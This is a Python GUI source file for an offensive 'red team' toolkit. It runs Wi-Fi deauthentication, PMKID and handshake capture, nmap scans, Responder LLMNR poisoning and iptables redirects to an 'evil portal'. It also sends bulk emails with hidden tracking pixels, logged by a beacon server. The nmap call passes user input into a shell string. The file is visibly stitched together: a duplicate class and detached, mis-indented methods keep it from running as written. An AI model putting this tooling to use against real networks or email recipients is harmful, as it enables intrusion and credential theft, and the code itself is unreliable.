
#!/usr/bin/env python3
# Netwatch Final Cyberpunk Edition — Unified Rebuild
import tkinter as tk
from tkinter import ttk, filedialog
from ttkthemes import ThemedTk
import subprocess, threading, sqlite3, time, csv, os, socket

class NetwatchApp:
    def __init__(self):
        self.root = ThemedTk(theme="equilux")
        self.root.title("🛸 Netwatch Red Team Toolkit")
        self.root.geometry("1200x800")
        self.root.configure(bg="#0f0f0f")
        self.style = ttk.Style(self.root)
        self.style.configure(".", background="#0f0f0f", foreground="#00ff99", font=("Consolas", 10))
        self.style.map("TButton", foreground=[("active", "#00ffff")])
        self.entries = {}
        self.undo_stack = []

        self.db = sqlite3.connect("netwatch.db")
        self.init_db()

        self.logbox = tk.Text(self.root, height=10, bg="black", fg="lime", insertbackground="white")
        self.logbox.pack(fill="x", padx=5, pady=5)

        notebook = ttk.Notebook(self.root)
        notebook.pack(expand=True, fill="both", padx=10, pady=10)
        self.tabs = {}
        for name in ["🔐 Login", "📊 Dashboard", "📧 Campaigns", "💣 Attacks", "🛠 DB Admin", "🧾 Logs"]:
            frame = ttk.Frame(notebook)
            notebook.add(frame, text=name)
            self.tabs[name] = frame

        self.build_campaign_tab()
        self.build_attack_tab()
        self.build_admin_db_browser()
        self.build_log_tab()
        self.start_beacon_server()

        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()

    def log(self, msg):
        self.logbox.insert("1.0", f"{msg}\n")

    def init_db(self):
        cur = self.db.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS campaigns (email TEXT, subject TEXT, status TEXT, opened TEXT, clicked TEXT, payload TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS beacons (email TEXT, ip TEXT, timestamp TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS logs (timestamp TEXT, action TEXT, email TEXT, details TEXT)")
        self.db.commit()

    # ... [Modules like build_campaign_tab, build_attack_tab, etc will be appended below in full]

# -- NOTE: Remaining methods will be appended from previous rebuild dynamically --

# === APPENDED MODULES START ===
class NetwatchApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🛡 Netwatch Full GUI v3")
        self.root.geometry("1100x700")
        self.entries = {}
        self.undo_stack = []

        self.tmplog = tk.Text(root, height=12, bg="#0a0a0a", fg="lime", insertbackground="white")
        self.tmplog.pack(side="bottom", fill="x")

        notebook = ttk.Notebook(root)
        notebook.pack(expand=True, fill="both")

        self.entries["SearchEmail"] = tk.StringVar()
        self.db = sqlite3.connect("netwatch.db")
        self.init_db()
        self.build_attack_tab()
        self.build_admin_db_browser()
        self.build_log_tab()

    def init_db(self):
        cur = self.db.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS campaigns (email TEXT, subject TEXT, status TEXT, opened TEXT, clicked TEXT, payload TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS beacons (email TEXT, ip TEXT, timestamp TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS logs (timestamp TEXT, action TEXT, email TEXT, details TEXT)")
        self.db.commit()

    def tmplog_insert(self, msg):
        self.tmplog.insert("1.0", msg + "\n")

    def log_action(self, action, email, details=""):
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        self.db.execute("INSERT INTO logs VALUES (?, ?, ?, ?)", (ts, action, email, details))
        self.db.commit()

def build_attack_tab(self):
        tab = ttk.Frame(self.root)
        notebook = self.root.nametowidget(".!notebook")
        notebook.add(tab, text="💣 Attacks")

        ttk.Label(tab, text="Wireless Attacks", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky="w")
        ttk.Label(tab, text="Interface").grid(row=1, column=0)
        ttk.Label(tab, text="BSSID").grid(row=2, column=0)
        ttk.Label(tab, text="Channel").grid(row=3, column=0)

        self.entries["W_IFACE"] = tk.StringVar()
        self.entries["W_BSSID"] = tk.StringVar()
        self.entries["W_CHAN"] = tk.StringVar()

        ttk.Entry(tab, textvariable=self.entries["W_IFACE"]).grid(row=1, column=1)
        ttk.Entry(tab, textvariable=self.entries["W_BSSID"]).grid(row=2, column=1)
        ttk.Entry(tab, textvariable=self.entries["W_CHAN"]).grid(row=3, column=1)

        ttk.Button(tab, text="⚡ Deauth", command=lambda: self.run_deauth_attack(
            self.entries["W_IFACE"].get(), self.entries["W_BSSID"].get(), self.entries["W_CHAN"].get())).grid(row=4, column=0)
        ttk.Button(tab, text="🔐 PMKID", command=lambda: self.run_pmkid_attack(self.entries["W_IFACE"].get())).grid(row=4, column=1)
        ttk.Button(tab, text="📡 Handshake", command=lambda: self.run_handshake_capture(
            self.entries["W_IFACE"].get(), self.entries["W_BSSID"].get(), self.entries["W_CHAN"].get())).grid(row=4, column=2)

        ttk.Label(tab, text="LAN Attacks", font=("Arial", 10, "bold")).grid(row=5, column=0, sticky="w", pady=(20, 0))
        ttk.Label(tab, text="Target/Subnet").grid(row=6, column=0)
        ttk.Label(tab, text="Options").grid(row=7, column=0)
        ttk.Label(tab, text="Interface").grid(row=8, column=0)

        self.entries["NMAP_TARGET"] = tk.StringVar()
        self.entries["NMAP_OPTS"] = tk.StringVar(value="-sS -T4")
        self.entries["LAN_IFACE"] = tk.StringVar()

        ttk.Entry(tab, textvariable=self.entries["NMAP_TARGET"]).grid(row=6, column=1)
        ttk.Entry(tab, textvariable=self.entries["NMAP_OPTS"]).grid(row=7, column=1)
        ttk.Entry(tab, textvariable=self.entries["LAN_IFACE"]).grid(row=8, column=1)

        ttk.Button(tab, text="🔍 Nmap Scan", command=lambda: self.run_nmap_scan(
            self.entries["NMAP_TARGET"].get(), self.entries["NMAP_OPTS"].get())).grid(row=9, column=0)
        ttk.Button(tab, text="🎯 LLMNR Spoof", command=lambda: self.run_llmnr_poison(
            self.entries["LAN_IFACE"].get())).grid(row=9, column=1)

    def run_deauth_attack(self, iface, bssid, channel):
        def task():
            self.tmplog_insert(f"⚡ Deauth attack on {bssid}@ch{channel} via {iface}")
            subprocess.call(["airmon-ng", "start", iface])
            subprocess.call(["iwconfig", iface + "mon", "channel", str(channel)])
            subprocess.call(["aireplay-ng", "--deauth", "1000", "-a", bssid, iface + "mon"])
        threading.Thread(target=task, daemon=True).start()

    def run_pmkid_attack(self, iface):
        def task():
            self.tmplog_insert(f"🔐 PMKID attack via {iface}")
            subprocess.call(["hcxdumptool", "-i", iface, "--enable_status=1", "-o", "pmkid.pcapng"])
        threading.Thread(target=task, daemon=True).start()

    def run_handshake_capture(self, iface, bssid, channel):
        def task():
            self.tmplog_insert(f"📡 Handshake capture from {bssid}@ch{channel} on {iface}")
            subprocess.call(["airodump-ng", "-c", str(channel), "--bssid", bssid, "-w", "handshake", iface])
        threading.Thread(target=task, daemon=True).start()

    def run_nmap_scan(self, target, opts):
        def task():
            self.tmplog_insert(f"🔍 Nmap scanning {target} with {opts}")
            out = subprocess.getoutput(f"nmap {opts} {target}")
            self.tmplog_insert(out)
        threading.Thread(target=task, daemon=True).start()

    def run_llmnr_poison(self, iface):
        def task():
            self.tmplog_insert(f"🎯 LLMNR/NBNS poisoning on {iface}")
            subprocess.call(["responder", "-I", iface, "-wrf"])
        threading.Thread(target=task, daemon=True).start()

def build_admin_db_browser(self):
        tab = ttk.Frame(self.root)
        notebook = self.root.nametowidget(".!notebook")
        notebook.add(tab, text="🛠 DB Admin")

        ttk.Label(tab, text="Search Email:").grid(row=0, column=0)
        search_entry = ttk.Entry(tab, textvariable=self.entries["SearchEmail"])
        search_entry.grid(row=0, column=1)
        ttk.Button(tab, text="🔍 Filter", command=self.filter_campaign_db).grid(row=0, column=2)
        ttk.Button(tab, text="↩️ Undo", command=self.undo_last_change).grid(row=0, column=3)

        self.db_tree = ttk.Treeview(tab, columns=("email", "subject", "status", "opened", "clicked", "payload"), show="headings")
        for col in self.db_tree["columns"]:
            self.db_tree.heading(col, text=col)
            self.db_tree.column(col, width=120)
        self.db_tree.grid(row=1, column=0, columnspan=5, sticky="nsew")

        ttk.Button(tab, text="🗑 Delete", command=self.delete_selected_entry).grid(row=2, column=0)
        ttk.Button(tab, text="📥 Import CSV", command=self.import_csv_to_db).grid(row=2, column=1)
        ttk.Button(tab, text="📤 Export Filtered", command=self.export_filtered_results).grid(row=2, column=2)

        self.db_tree.bind("<Double-1>", self.on_db_tree_edit)
        tab.grid_rowconfigure(1, weight=1)
        tab.grid_columnconfigure(1, weight=1)

        self.filter_campaign_db()

    def filter_campaign_db(self):
        q = self.entries["SearchEmail"].get()
        rows = self.db.execute("SELECT * FROM campaigns WHERE email LIKE ?", (f"%{q}%",)).fetchall()
        self.db_tree.delete(*self.db_tree.get_children())
        for r in rows:
            self.db_tree.insert("", "end", values=r)

    def delete_selected_entry(self):
        sel = self.db_tree.selection()
        if not sel: return
        val = self.db_tree.item(sel[0])["values"]
        self.undo_stack.append(("insert", val))
        self.db.execute("DELETE FROM campaigns WHERE email=? AND subject=?", (val[0], val[1]))
        self.db.commit()
        self.db_tree.delete(sel[0])
        self.log_action("delete", val[0], val[1])

    def on_db_tree_edit(self, event):
        sel = self.db_tree.selection()
        if not sel: return
        col = self.db_tree.identify_column(event.x)
        col_idx = int(col.replace("#", "")) - 1
        col_name = self.db_tree["columns"][col_idx]
        item = self.db_tree.item(sel[0])
        old = item["values"][col_idx]

        top = tk.Toplevel(self.root)
        top.title(f"Edit {col_name}")
        entry = ttk.Entry(top)
        entry.insert(0, str(old))
        entry.pack()

        def save_edit():
            new = entry.get()
            vals = item["values"]
            self.undo_stack.append(("update", vals[0], col_name, old))
            vals[col_idx] = new
            self.db_tree.item(sel[0], values=vals)
            self.db.execute(f"UPDATE campaigns SET {col_name}=? WHERE email=?", (new, vals[0]))
            self.db.commit()
            top.destroy()
            self.log_action("edit", vals[0], f"{col_name} → {new}")

        ttk.Button(top, text="Save", command=save_edit).pack()

    def undo_last_change(self):
        if not self.undo_stack:
            return
        op = self.undo_stack.pop()
        if op[0] == "insert":
            self.db.execute("INSERT INTO campaigns VALUES (?, ?, ?, ?, ?, ?)", tuple(op[1]))
        elif op[0] == "update":
            self.db.execute(f"UPDATE campaigns SET {op[2]}=? WHERE email=?", (op[3], op[1]))
        self.db.commit()
        self.filter_campaign_db()

    def import_csv_to_db(self):
        path = filedialog.askopenfilename(filetypes=[("CSV", "*.csv")])
        if not path: return
        with open(path) as f:
            r = csv.DictReader(f)
            for row in r:
                self.db.execute("INSERT INTO campaigns VALUES (?, ?, ?, ?, ?, ?)",
                    (row["email"], row["subject"], row["status"], row["opened"], row["clicked"], row["payload"]))
        self.db.commit()
        self.filter_campaign_db()

    def export_filtered_results(self):
        rows = [self.db_tree.item(i)["values"] for i in self.db_tree.get_children()]
        if not rows: return
        with open("filtered_export.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(self.db_tree["columns"])
            w.writerows(rows)

    def build_log_tab(self):
        logtab = ttk.Frame(self.root)
        notebook = self.root.nametowidget(".!notebook")
        notebook.add(logtab, text="🧾 Logs")

        self.log_tree = ttk.Treeview(logtab, columns=("ts", "action", "email", "details"), show="headings")
        for col in self.log_tree["columns"]:
            self.log_tree.heading(col, text=col)
            self.log_tree.column(col, width=120)
        self.log_tree.grid(row=0, column=0, sticky="nsew")

        def load_logs():
            rows = self.db.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100").fetchall()
            self.log_tree.delete(*self.log_tree.get_children())
            for r in rows:
                self.log_tree.insert("", "end", values=r)

        ttk.Button(logtab, text="🔄 Refresh Logs", command=load_logs).grid(row=1, column=0)
        logtab.grid_rowconfigure(0, weight=1)
        logtab.grid_columnconfigure(0, weight=1)

def start_beacon_server(self):
        import http.server, socketserver

        class BeaconHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if "/track" in self.path and "uid=" in self.path:
                    from urllib.parse import urlparse, parse_qs
                    qs = parse_qs(urlparse(self.path).query)
                    uid = qs.get("uid", ["unknown"])[0]
                    ip = self.client_address[0]
                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
                    self.server.db.execute("INSERT INTO beacons VALUES (?, ?, ?)", (uid, ip, ts))
                    self.server.db.commit()
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"OK")
                else:
                    self.send_response(404)
                    self.end_headers()

        def serve():
            self.tmplog_insert("📡 Beacon webserver started (port 9090)")
            with socketserver.TCPServer(("", 9090), BeaconHandler) as httpd:
                httpd.db = self.db
                httpd.serve_forever()

        threading.Thread(target=serve, daemon=True).start()

    def setup_iptables_redirect(self):
        cmds = [
            "iptables -t nat -F",
            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
            "iptables -A FORWARD -j ACCEPT",
            "echo 1 > /proc/sys/net/ipv4/ip_forward"
        ]
        for cmd in cmds:
            subprocess.call(cmd, shell=True)
        self.tmplog_insert("✅ iptables redirect rules set (HTTP → evil portal)")

    def cleanup_on_exit(self):
        cmds = [
            "iptables -t nat -F",
            "killall -9 responder hcxdumptool aireplay-ng airodump-ng",
            "airmon-ng stop wlan0mon || true"
        ]
        for cmd in cmds:
            subprocess.call(cmd, shell=True)
        self.tmplog_insert("🧹 Cleanup done. Threads and iptables reset.")

def send_email_campaign(self, smtp_server, smtp_port, smtp_user, smtp_pass, subject, body_template, emails):
        import smtplib
        from email.mime.text import MIMEText

        def embed_beacon(uid):
            return f'<img src="http://{self.get_local_ip()}:9090/track?uid={uid}" width="1" height="1" />'

        def send_all():
            try:
                server = smtplib.SMTP(smtp_server, smtp_port)
                server.starttls()
                server.login(smtp_user, smtp_pass)
                for email in emails:
                    html = body_template.replace("{{uid}}", email) + embed_beacon(email)
                    msg = MIMEText(html, "html")
                    msg["Subject"] = subject
                    msg["From"] = smtp_user
                    msg["To"] = email
                    server.sendmail(smtp_user, email, msg.as_string())
                    self.db.execute("INSERT INTO campaigns VALUES (?, ?, ?, ?, ?, ?)", (email, subject, "sent", "", "", ""))
                    self.tmplog_insert(f"📧 Sent to {email}")
                self.db.commit()
                server.quit()
            except Exception as e:
                self.tmplog_insert(f"❌ Email send error: {e}")

        threading.Thread(target=send_all, daemon=True).start()

    def get_local_ip(self):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except:
            return "127.0.0.1"
        finally:
            s.close()

def build_campaign_tab(self):
        tab = ttk.Frame(self.root)
        notebook = self.root.nametowidget(".!notebook")
        notebook.add(tab, text="📧 Campaigns")

        ttk.Label(tab, text="SMTP Server").grid(row=0, column=0)
        ttk.Label(tab, text="Port").grid(row=1, column=0)
        ttk.Label(tab, text="User").grid(row=2, column=0)
        ttk.Label(tab, text="Password").grid(row=3, column=0)
        ttk.Label(tab, text="Subject").grid(row=4, column=0)
        ttk.Label(tab, text="Body HTML").grid(row=5, column=0)
        ttk.Label(tab, text="Target Emails (CSV)").grid(row=6, column=0)

        self.entries["SMTP_SERVER"] = tk.StringVar(value="smtp.gmail.com")
        self.entries["SMTP_PORT"] = tk.StringVar(value="587")
        self.entries["SMTP_USER"] = tk.StringVar()
        self.entries["SMTP_PASS"] = tk.StringVar()
        self.entries["SUBJECT"] = tk.StringVar()
        self.entries["BODY"] = tk.Text(tab, height=5, width=80)
        self.entries["EMAILS"] = tk.Text(tab, height=5, width=80)

        ttk.Entry(tab, textvariable=self.entries["SMTP_SERVER"]).grid(row=0, column=1)
        ttk.Entry(tab, textvariable=self.entries["SMTP_PORT"]).grid(row=1, column=1)
        ttk.Entry(tab, textvariable=self.entries["SMTP_USER"]).grid(row=2, column=1)
        ttk.Entry(tab, textvariable=self.entries["SMTP_PASS"], show="*").grid(row=3, column=1)
        ttk.Entry(tab, textvariable=self.entries["SUBJECT"]).grid(row=4, column=1)
        self.entries["BODY"].grid(row=5, column=1)
        self.entries["EMAILS"].grid(row=6, column=1)

        ttk.Button(tab, text="🚀 Send Campaign", command=self.run_send_ui).grid(row=7, column=1)

    def run_send_ui(self):
        body = self.entries["BODY"].get("1.0", "end-1c")
        emails = self.entries["EMAILS"].get("1.0", "end-1c").strip().split(",")
        self.send_email_campaign(
            self.entries["SMTP_SERVER"].get(),
            int(self.entries["SMTP_PORT"].get()),
            self.entries["SMTP_USER"].get(),
            self.entries["SMTP_PASS"].get(),
            self.entries["SUBJECT"].get(),
            body,
            emails
        )

    def on_close(self):
        self.cleanup_on_exit()
        self.root.destroy()
# === APPENDED MODULES END ===
